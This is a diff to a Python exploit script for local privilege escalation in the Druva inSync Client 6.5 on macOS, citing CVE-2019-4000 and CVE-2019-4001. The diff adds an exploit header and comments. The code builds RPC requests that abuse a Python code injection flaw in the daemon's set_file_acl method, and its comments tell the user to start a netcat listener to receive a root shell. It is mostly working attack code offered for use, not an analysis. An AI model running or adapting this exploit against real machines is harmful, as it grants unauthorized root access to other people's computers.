@@ -1,14 +1,19 @@
-import subprocess
-import os
-import sys
-import time
-import random
-import socket
-import marshal
-import struct
-import zlib
-import zipfile
-import shutil
+import os,subprocess,sys,socket,marshal,struct
+import time,random
+import zlib,zipfile,shutil
+
+# Exploit Title: Druva inSync Client 6.5 OS X Local Privilege Escalation
+# Date: 04-10-2020
+# Exploit Author: Chris Lyne (@lynerc)
+# Vendor Homepage: www.druva.com
+# Software Link: https://downloads.druva.com/downloads/inSync/MAC/6.5.1/inSync-6.5.1r96080.dmg
+# Version: Druva inSync Client 6.5.0 r92641
+# Tested on: Mac OS X
+# CVE : CVE-2019-4000, CVE-2019-4001
+# See Also: https://www.tenable.com/security/research/tra-2020-12
+
+# you need druva_insync_osx_get_token.zip in the same directory. it will be unzipped at runtime
+# start a netcat listener on localhost and you'll get a root shell
 
 def build_post(data):
     message = "POST /api HTTP/1.1" + "\r\n"
@@ -43,7 +48,6 @@ def send_rpc_request(sock, req_obj, unknown):
     message = build_post(post_data)
     try:
         sock.send(message)
-        #print("Sent request.")
 
         resp = sock.recv(1024)
 
@@ -74,7 +78,6 @@ def gen_random_token(size=20):
     return token
 
 # rpc service unmarshals object and calls method with arguments
-# daemon.set_file_acl has a python code injection vuln
 def exploit_set_secrets(token):
     new_token = gen_random_token()
     daemon_set_secrets = {
@@ -108,6 +111,7 @@ def exploit_set_secrets(token):
 
 # rpc service unmarshals object and calls method with arguments
 # daemon.set_file_acl has a python code injection vuln
+# CVE-2019-4000
 def exploit_set_file_acl(token, py_expr):
     daemon_set_file_acl = {
         'Requests': [
@@ -132,6 +136,7 @@ def exploit_set_file_acl(token, py_expr):
 
 # First, we need to unzip the zip archive
 # will extract index.html and node_modules dir
+# contains exploit for CVE-2019-4001
 zip_filename = 'druva_insync_osx_get_token.zip'
 
 print 'Extracting zip file...'
@@ -141,7 +146,6 @@ with zipfile.ZipFile(zip_filename, 'r') as myzip:
 
 to_delete = ['index.html', 'node_modules']
 
-# TODO maybe make this parameterized?
 executable = '/Applications/Druva\ inSync.app/Contents/Resources/inSync.app'
 
 if not os.path.exists(executable.replace('\\', '')):
